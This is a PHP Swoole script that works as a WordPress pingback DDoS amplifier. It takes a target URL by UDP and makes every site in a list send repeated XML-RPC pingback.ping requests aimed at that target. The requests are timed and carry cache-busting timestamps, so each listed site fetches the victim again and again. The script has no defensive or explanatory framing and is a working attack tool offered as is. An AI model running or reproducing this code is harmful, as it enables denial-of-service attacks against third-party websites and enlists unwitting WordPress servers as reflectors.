<?php
class PingBack
{
    private $sites;
    private $file = './pages.txt';
    private $times = 120;
    private $user;

    public function __construct()
    {
        $handle = fopen($this->file, "r");
        if ($handle) {
            while (($buffer = fgets($handle)) !== false) {
                $this->sites[] = trim($buffer);
            }
            echo count(($this->sites)) . PHP_EOL;
            fclose($handle);
        }
    }

    public function handle()
    {
        $serv = new swoole_server("127.0.0.1", 9503);
        $serv->addlistener("127.0.0.1", 9504 , SWOOLE_UDP);
        $serv->set(array(
            'task_worker_num' => 200,
            'worker_num' => 4,
            'daemonize'   => 0,
        ));

        $serv->on('Packet', function($serv, $data, array $client_info) {
            $jsonData = json_decode($data, true);
            if (!isset($this->user[$jsonData['uid']])) {
                $this->user[$jsonData['uid']] = [
                    'tid' => '',
                    'url' => $jsonData['url'],
                    'times' => 0
                ];

                $tid = $serv->tick(500, function ($tid) use ($serv) {
                    foreach ($this->user as &$v) {
                        if ($v['tid'] == $tid) {
                            echo "{$tid} {$v['times']}\n";
                            if ($v['times'] > $this->times) {
                                swoole_timer_clear($tid);
                                break;
                            }
                            foreach ($this->sites as $site) {
                                $serv->task([$site, $v['url']]);
                            }
                            $v['times']++;
                        }
                    }
                });
                $this->user[$jsonData['uid']]['tid'] = $tid;
            }
        });

        $serv->on('WorkerStart', function($serv, $worker_id) {
            if ($worker_id == 0) {

            }
        });

        $serv->on('Task', function ($serv, $task_id, $from_id, $data) {
            $parse = parse_url($data[0]);
            $port = isset($parse['port']) ? $parse['port'] : 80;
            $fp = @stream_socket_client("tcp://{$parse['host']}:{$port}", $code, $msg, 15);
            if ($fp) {
                $url = $data[1];
                $url .= '?t=' . microtime(true);
                echo "{$data[0]}\n";
                $content = '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>'.$url.'</string></value></param><param><value><string>'.$data[0].'</string></value></param></params></methodCall>';

                fwrite($fp, "POST /xmlrpc.php HTTP/1.1\r\n");
                fwrite($fp, "Host: {$parse['host']}\r\n");
                fwrite($fp, "Content-Length: ".strlen($content)."\r\n");
                fwrite($fp, "Connection: close\r\n");
                fwrite($fp, "\r\n");
                fwrite($fp, $content);

                fclose($fp);
            }


            $serv->finish("OK");
        });

        $serv->on('Finish', function ($serv, $task_id, $data) {});
        $serv->start();

    }
}

(new PingBack)->handle();